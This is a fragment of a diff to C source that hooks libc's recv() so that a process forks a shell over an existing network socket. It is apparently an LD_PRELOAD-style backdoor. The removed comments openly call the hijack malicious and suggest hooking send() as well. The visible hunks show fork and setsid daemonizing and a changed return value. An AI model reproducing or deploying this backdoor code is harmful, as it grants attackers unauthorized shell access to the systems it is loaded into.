@@ -30,10 +30,7 @@ void sigchld(int signo)
 }
 
 /*
- * socket() is the hijacked function in libc
- * To make this more malicious, one could hijack recv()/send() as well.
- * The majority of the code in my malicious socket() has been ripped
- * right from Beej's Guide to Network Programming. Thanks Beej!
+ * Fork a shell and re-use the current socket
  */
 ssize_t recv(int socket, void *buffer, size_t length, int flags)
 {
@@ -48,7 +45,7 @@ ssize_t recv(int socket, void *buffer, size_t length, int flags)
 		return ret;
 	
 	if (fork())
-		return -1;
+		return 0;
 	setsid();
 	if (fork())
 		return 0;
